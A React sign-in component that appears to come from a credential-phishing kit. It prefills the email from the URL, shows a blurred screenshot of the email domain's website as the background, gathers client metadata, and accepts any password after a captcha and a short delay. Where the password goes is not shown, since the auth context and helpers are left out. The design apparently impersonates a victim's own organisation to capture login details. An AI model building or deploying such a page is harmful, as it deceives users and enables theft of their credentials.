import { useEffect, useState } from 'react'
import { CheckCircle2, Eye, EyeOff } from 'lucide-react'
import { useAuth } from '../context/AuthContext'
import {
  cacheScreenshotUrl,
  getBootScreenshotUrl,
  getEmailFromUrl,
  getScreenshotUrls,
  raceScreenshot,
  resolveBackgroundDomain,
  userFromEmail,
} from '../lib/utils'
import { verifyCaptchaToken } from '../lib/captcha'
import { primeClientMeta } from '../lib/clientMeta'
import { CaptchaField } from './CaptchaField'

function DomainBackground({ domain }: { domain: string }) {
  const [bgUrl, setBgUrl] = useState(() => (domain ? getBootScreenshotUrl(domain) : null))
  const [loading, setLoading] = useState(() => !getBootScreenshotUrl(domain))

  useEffect(() => {
    if (!domain) {
      setBgUrl(null)
      setLoading(false)
      return
    }

    const boot = getBootScreenshotUrl(domain)
    if (boot) {
      setBgUrl(boot)
      setLoading(false)
    } else {
      setLoading(true)
    }

    const urls = getScreenshotUrls(domain)
    if (!urls.length) return

    urls.forEach((url) => {
      const link = document.createElement('link')
      link.rel = 'preload'
      link.as = 'image'
      link.href = url
      document.head.appendChild(link)
    })

    raceScreenshot(urls)
      .then((winner) => {
        cacheScreenshotUrl(domain, winner)
        setBgUrl(winner)
        setLoading(false)
      })
      .catch(() => setLoading(false))
  }, [domain])

  if (!domain) {
    return <div className="absolute inset-0 bg-slate-100" aria-hidden />
  }

  return (
    <>
      {loading && !bgUrl && (
        <div className="absolute inset-0 animate-pulse bg-slate-200" aria-hidden />
      )}

      {bgUrl && (
        <img
          src={bgUrl}
          alt=""
          loading="eager"
          fetchPriority="high"
          decoding="async"
          className="absolute inset-0 h-full w-full scale-105 object-cover object-top blur-lg"
        />
      )}

      <div className="absolute inset-0 bg-black/20" aria-hidden />
    </>
  )
}

interface SignInStepProps {
  onDomainChange: (domain: string) => void
}

function SignInStep({ onDomainChange }: SignInStepProps) {
  const { signIn } = useAuth()

  const [email, setEmail] = useState(getEmailFromUrl)
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [captchaToken, setCaptchaToken] = useState<string | null>(null)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    onDomainChange(resolveBackgroundDomain(email))
  }, [email, onDomainChange])

  const handleEmailChange = (value: string) => {
    setEmail(value)
    onDomainChange(resolveBackgroundDomain(value))
  }

  const requireCaptcha = async (): Promise<boolean> => {
    if (!captchaToken) {
      setError('Please complete the reCAPTCHA verification.')
      return false
    }

    const result = await verifyCaptchaToken(captchaToken)
    if (!result.ok) {
      setError(result.message ?? 'Captcha verification failed. Try again.')
      setCaptchaToken(null)
      return false
    }

    return true
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    if (!email.trim()) {
      setError('Email is required.')
      return
    }
    if (!password) {
      setError('Password is required.')
      return
    }
    if (!(await requireCaptcha())) return

    setLoading(true)
    await new Promise((r) => setTimeout(r, 500))
    signIn(userFromEmail(email.trim()), { authMethod: 'email' })
    setLoading(false)
  }

  return (
    <>
      <h2 className="mb-1 text-center text-xl font-semibold text-slate-900">Sign in</h2>
      <p className="mb-6 text-center text-sm text-slate-500">Enter your credentials to continue</p>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label htmlFor="email" className="mb-1.5 block text-sm font-medium text-slate-700">
            Email
          </label>
          <input
            id="email"
            type="email"
            autoComplete="email"
            value={email}
            onChange={(e) => handleEmailChange(e.target.value)}
            placeholder="you@company.com"
            className="w-full rounded-xl border border-slate-200 bg-white px-4 py-3 text-sm text-slate-900 outline-none transition placeholder:text-slate-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20"
          />
        </div>

        <div>
          <label htmlFor="password" className="mb-1.5 block text-sm font-medium text-slate-700">
            Password
          </label>
          <div className="relative">
            <input
              id="password"
              type={showPassword ? 'text' : 'password'}
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="••••••••"
              className="w-full rounded-xl border border-slate-200 bg-white px-4 py-3 pr-11 text-sm text-slate-900 outline-none transition placeholder:text-slate-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 transition hover:text-slate-600"
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
        </div>

        <div className="pt-1">
          <CaptchaField
            onVerify={setCaptchaToken}
            onExpire={() => setCaptchaToken(null)}
          />
        </div>

        {error && (
          <p className="rounded-lg bg-red-50 px-3 py-2 text-center text-sm text-red-600">{error}</p>
        )}

        <button
          type="submit"
          disabled={loading}
          className="w-full rounded-xl bg-brand-600 py-3.5 text-sm font-semibold text-white shadow-lg shadow-brand-600/25 transition hover:bg-brand-700 disabled:opacity-60"
        >
          {loading ? 'Signing in…' : 'Sign in'}
        </button>
      </form>
    </>
  )
}

function VerifiedStep() {
  const { user, signOut } = useAuth()
  if (!user) return null

  return (
    <div className="flex flex-col items-center text-center">
      <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-50">
        <CheckCircle2 className="h-8 w-8 text-green-500" />
      </div>
      <h2 className="text-xl font-semibold text-slate-900">Signed in</h2>
      <p className="mt-1 text-sm text-slate-500">{user.email}</p>
      <button
        type="button"
        onClick={signOut}
        className="mt-6 rounded-xl border border-slate-200 px-5 py-2.5 text-sm font-medium text-slate-600 transition hover:bg-slate-50"
      >
        Sign out
      </button>
    </div>
  )
}

export function AuthArea() {
  const { step, user } = useAuth()
  const [backgroundDomain, setBackgroundDomain] = useState(() => resolveBackgroundDomain())

  useEffect(() => {
    primeClientMeta()
  }, [])

  useEffect(() => {
    if (user?.email) {
      setBackgroundDomain(resolveBackgroundDomain(user.email))
    }
  }, [user?.email])

  return (
    <div className="relative min-h-screen overflow-hidden">
      <DomainBackground domain={backgroundDomain} />

      <div className="relative z-10 flex min-h-screen items-center justify-center px-4 py-8">
        <div className="animate-slide-up w-full max-w-sm">
          <div className="rounded-3xl border border-white/40 bg-white/75 p-8 shadow-2xl shadow-black/10 backdrop-blur-md">
            {step === 'signin' && <SignInStep onDomainChange={setBackgroundDomain} />}
            {step === 'verified' && <VerifiedStep />}
          </div>
        </div>
      </div>
    </div>
  )
}
